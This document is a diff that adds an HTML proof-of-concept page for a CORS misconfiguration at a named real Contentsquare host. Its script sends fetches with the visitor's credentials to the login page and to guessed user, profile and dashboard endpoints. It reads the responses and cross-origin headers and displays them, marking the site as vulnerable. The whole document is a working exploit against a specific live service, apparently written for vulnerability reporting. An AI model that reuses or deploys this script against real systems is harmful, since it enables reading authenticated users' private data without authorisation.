@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Advanced CORS Exploit - Contentsquare</title>
+</head>
+<body>
+    <h1>Contentsquare CORS Vulnerability PoC</h1>
+    <div id="status">Testing CORS configuration...</div>
+    <div id="results"></div>
+
+    <script>
+        const targetURL = 'https://cshelper.contentsquare.com/login/signin.aspx?returnTo=%2f';
+        
+        async function testEndpoints() {
+            const endpoints = [
+                '/login/signin.aspx',
+                '/api/user', // Common API endpoint pattern
+                '/user/profile', // Common profile endpoint
+                '/dashboard' // Common dashboard
+            ];
+            
+            const baseURL = 'https://cshelper.contentsquare.com';
+            
+            for (const endpoint of endpoints) {
+                try {
+                    const response = await fetch(baseURL + endpoint, {
+                        method: 'GET',
+                        credentials: 'include',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        }
+                    });
+                    
+                    if (response.ok) {
+                        const text = await response.text();
+                        document.getElementById('results').innerHTML += 
+                            `<div style="background: #f0f0f0; margin: 10px; padding: 10px;">
+                                <h3>✓ Accessible: ${endpoint}</h3>
+                                <p>Status: ${response.status}</p>
+                                <p>Content Sample: ${text.substring(0, 200)}...</p>
+                            </div>`;
+                    }
+                } catch (error) {
+                    document.getElementById('results').innerHTML += 
+                        `<div style="background: #ffe6e6; margin: 10px; padding: 10px;">
+                            <h3>✗ Blocked: ${endpoint}</h3>
+                            <p>Error: ${error.message}</p>
+                        </div>`;
+                }
+            }
+        }
+        
+        // Test the main vulnerable endpoint
+        fetch(targetURL, {
+            credentials: 'include'
+        })
+        .then(response => {
+            document.getElementById('status').innerHTML = 
+                `<h2 style="color: green;">✓ VULNERABLE CONFIRMED</h2>
+                 <p>Origin: ${window.location.origin}</p>
+                 <p>Allowed Origin: ${response.headers.get('Access-Control-Allow-Origin')}</p>
+                 <p>Credentials Allowed: ${response.headers.get('Access-Control-Allow-Credentials')}</p>`;
+            
+            return response.text();
+        })
+        .then(data => {
+            document.getElementById('results').innerHTML += 
+                `<div style="background: #e6ffe6; margin: 10px; padding: 10px;">
+                    <h3>Main Page Content Accessed</h3>
+                    <p>Response contains: ${data.length} characters</p>
+                    <details>
+                        <summary>View Response (first 500 chars)</summary>
+                        <pre>${data.substring(0, 500)}</pre>
+                    </details>
+                </div>`;
+            
+            // Test additional endpoints
+            testEndpoints();
+        })
+        .catch(error => {
+            document.getElementById('status').innerHTML = 
+                `<h2 style="color: red;">✗ Exploit Failed</h2>
+                 <p>${error.message}</p>`;
+        });
+    </script>
+</body>
+</html>
